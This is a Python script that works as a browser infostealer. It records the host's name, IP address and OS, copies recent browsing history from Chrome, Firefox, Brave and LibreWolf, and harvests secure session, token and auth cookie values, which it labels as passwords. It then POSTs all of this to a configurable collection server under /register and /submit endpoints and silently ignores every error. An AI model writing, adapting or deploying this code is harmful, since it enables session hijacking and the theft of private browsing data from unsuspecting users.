import os
import sys
import json
import uuid
import socket
import sqlite3
import platform
import requests
import tempfile
import browser_cookie3
import psutil
from datetime import datetime, timedelta

SERVER_URL = "http://127.0.0.1:5000" # adjust to an actual host IP
MACHINE_ID = str(uuid.getnode())

# ========== INFO GATHERING ==========
def get_system_info():
    try:
        return {
            "machine_id": MACHINE_ID,
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "os_info": f"{platform.system()} {platform.release()}"
        }
    except Exception as e:
        return {"machine_id": MACHINE_ID, "error": str(e)}

# ========== BROWSER HISTORY ==========
def extract_history_from_sqlite(path, query, parse_row_fn):
    if not os.path.exists(path):
        return []
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        temp_path = tmp.name
    try:
        os.system(f"cp '{path}' '{temp_path}'")
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute(query)
        history = [parse_row_fn(row) for row in cursor.fetchall()]
        conn.close()
        return history
    except Exception:
        return []
    finally:
        os.remove(temp_path)

def extract_chrome_history():
    if platform.system() == "Linux":
        path = os.path.expanduser("~/.config/google-chrome/Default/History")
    elif platform.system() == "Windows":
        path = os.path.join(os.getenv("LOCALAPPDATA", ""), "Google\\Chrome\\User Data\\Default\\History")
    else:
        return []

    query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
    def parser(row):
        url, title, ts = row
        dt = (datetime(1601, 1, 1) + timedelta(microseconds=ts)).isoformat()
        return {"url": url, "title": title, "visit_time": dt, "browser_type": "chrome"}

    return extract_history_from_sqlite(path, query, parser)

def extract_firefox_history():
    base = os.path.expanduser("~/.mozilla/firefox") if platform.system() == "Linux" else ""
    if not base or not os.path.exists(base):
        return []
    profiles = [d for d in os.listdir(base) if "default" in d]
    if not profiles:
        return []
    path = os.path.join(base, profiles[0], "places.sqlite")

    query = """
        SELECT url, title, visit_date
        FROM moz_places JOIN moz_historyvisits
        ON moz_historyvisits.place_id = moz_places.id
        ORDER BY visit_date DESC LIMIT 100
    """
    def parser(row):
        url, title, ts = row
        dt = datetime.fromtimestamp(ts / 1_000_000).isoformat()
        return {"url": url, "title": title, "visit_time": dt, "browser_type": "firefox"}

    return extract_history_from_sqlite(path, query, parser)

def extract_brave_history():
    if platform.system() == "Linux":
        path = os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/History")
    elif platform.system() == "Windows":
        path = os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware\\Brave-Browser\\User Data\\Default\\History")
    else:
        return []

    query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
    def parser(row):
        url, title, ts = row
        dt = (datetime(1601, 1, 1) + timedelta(microseconds=ts)).isoformat()
        return {"url": url, "title": title, "visit_time": dt, "browser_type": "brave"}

    return extract_history_from_sqlite(path, query, parser)

def extract_librewolf_history():
    base = os.path.expanduser("~/.librewolf") if platform.system() == "Linux" else ""
    if not base or not os.path.exists(base):
        return []
    profiles = [d for d in os.listdir(base) if "default" in d]
    if not profiles:
        return []
    path = os.path.join(base, profiles[0], "places.sqlite")

    query = """
        SELECT url, title, visit_date
        FROM moz_places JOIN moz_historyvisits
        ON moz_historyvisits.place_id = moz_places.id
        ORDER BY visit_date DESC LIMIT 100
    """
    def parser(row):
        url, title, ts = row
        dt = datetime.fromtimestamp(ts / 1_000_000).isoformat()
        return {"url": url, "title": title, "visit_time": dt, "browser_type": "librewolf"}

    return extract_history_from_sqlite(path, query, parser)

def get_browser_history():
    return extract_chrome_history() + extract_firefox_history() + extract_brave_history() + extract_librewolf_history()

# ========== CREDENTIALS ==========
def get_saved_credentials():
    credentials = []
    try:
        for cookie in browser_cookie3.chrome():
            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "chrome"
                })
    except Exception:
        pass
    try:
        for cookie in browser_cookie3.firefox():
            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "firefox"
                })
    except Exception:
        pass
    try:
        for cookie in browser_cookie3.brave():
            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "brave"
                })
    except Exception:
        pass
    try:
        for cookie in browser_cookie3.librewolf():
            if cookie.secure and cookie.name.lower() in ("session", "token", "auth"):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "librewolf"
                })
    except Exception:
        pass
    return credentials

# ========== DATA TRANSMISSION ==========
def register_machine():
    try:
        r = requests.post(f"{SERVER_URL}/register", json=get_system_info(), timeout=5)
        return r.ok
    except requests.RequestException:
        return False

def send_data():
    if not register_machine():
        return
    try:
        requests.post(f"{SERVER_URL}/submit/history", json={
            "machine_id": MACHINE_ID,
            "history": get_browser_history()
        }, timeout=10)
        requests.post(f"{SERVER_URL}/submit/credentials", json={
            "machine_id": MACHINE_ID,
            "credentials": get_saved_credentials()
        }, timeout=10)
    except requests.RequestException:
        pass

# ========== MAIN ==========
if __name__ == "__main__":
    send_data()
